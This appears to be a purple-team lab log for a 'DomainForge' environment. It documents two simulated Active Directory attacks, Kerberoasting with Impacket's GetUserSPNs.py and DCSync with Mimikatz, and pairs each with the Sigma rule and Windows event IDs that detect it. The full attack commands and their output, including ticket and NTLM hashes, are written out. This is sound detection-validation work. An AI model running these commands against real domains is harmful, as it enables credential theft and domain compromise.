# Adversary Emulation & Evidence Log

This document serves as cryptographic and operational evidence of the attacks simulated within the `DomainForge` environment to validate the detections in `Argus-Detections`.

## 🩸 Scenario 1: Kerberoasting (T1558.003)

**Objective:** Request RC4 (0x17) encrypted Service Tickets (TGS) for offline cracking.
**Tooling:** Impacket (`GetUserSPNs.py`)

### Attack Execution Log (Kali Linux)
```bash
$ GetUserSPNs.py corp.local/svc_sql -dc-ip 10.0.1.10 -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName                 Name      MemberOf   PasswordLastSet             
-----------------------------------  --------  ---------  -------------------
MSSQLSvc/db01.corp.local:1433        svc_sql   Domain Admins  2023-01-01 10:00:00

[*] Requesting tickets...
[*] Found 1 TGS tickets. Outputting in Hashcat format:
$krb5tgs$23$*svc_sql$corp.local$MSSQLSvc/db01.corp.local*...<TRUNCATED>...
```

### Detection Evidence (Blue Team)
*   **Triggered Rule:** `Argus-Detections/sigma/windows/active_directory/ad_kerberoasting_rc4.yml`
*   **Telemetry Source:** Domain Controller `Security.evtx`
*   **Artifact:** Event ID `4769` (A Kerberos service ticket was requested) where `Ticket Encryption Type` = `0x17`.

---

## 🩸 Scenario 2: DCSync (T1003.006)

**Objective:** Simulate a Domain Controller to replicate password hashes from Active Directory via the Directory Replication Service (DRS) Remote Protocol.
**Tooling:** Mimikatz

### Attack Execution Log (Compromised Endpoint)
```cmd
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
[DC] 'corp.local' will be the domain
[DC] 'DC01.corp.local' will be the DC server
[DC] 'krbtgt' will be the user account

Object RDN           : krbtgt
** SAM ACCOUNT **
SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : (never)
Password last change : 10/9/2026 10:14:00 AM
Object Security ID   : S-1-5-21-123456789-123456789-123456789-502

Credentials:
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
```

### Detection Evidence (Blue Team)
*   **Triggered Rule:** `Argus-Detections/sigma/windows/active_directory/ad_dcsync_attack.yml`
*   **Telemetry Source:** Domain Controller `Security.evtx`
*   **Artifact:** Event ID `4662` (An operation was performed on an object) containing `Properties: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (DS-Replication-Get-Changes).
